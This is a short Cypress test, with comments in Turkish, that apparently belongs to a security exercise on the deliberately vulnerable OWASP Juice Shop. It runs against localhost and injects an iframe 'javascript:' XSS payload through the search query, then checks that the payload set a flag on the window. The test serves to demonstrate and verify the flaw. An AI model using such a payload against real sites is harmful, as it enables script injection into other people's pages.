/// <reference types="cypress" />

describe('XSS Test – OWASP Juice Shop (Variable Injection)', () => {
  it('should prove XSS by modifying the window object', () => {
    
    // XSS kodumuz çalıştığında, ana pencerede 'hacked' adında bir değişken oluşturacak.
    const payload = `<iframe src="javascript:window.parent.hacked=true"></iframe>`;

    // 1. Ziyaret et ve payload'ı gönder
    cy.visit(`http://localhost:3000/#/search?q=${encodeURIComponent(payload)}`);

    // 2. Kanıtı Kontrol Et
    cy.window().should('have.property', 'hacked', true);
  });
});
